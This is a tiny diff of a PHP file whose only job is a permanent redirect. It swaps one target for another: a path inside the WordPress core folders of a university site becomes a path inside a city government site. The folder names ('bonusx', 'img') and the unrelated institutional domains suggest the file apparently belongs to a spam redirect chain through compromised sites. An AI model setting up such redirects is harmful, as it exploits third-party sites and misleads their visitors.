@@ -1,4 +1,4 @@
 <?php
-header("Location: https://agroekoteknologi.fpp.undip.ac.id/wp-includes/bonusx/", true, 301);
+header("Location: https://dishub.ppid.semarangkota.go.id/wp-content/img/", true, 301);
 exit();
 ?>
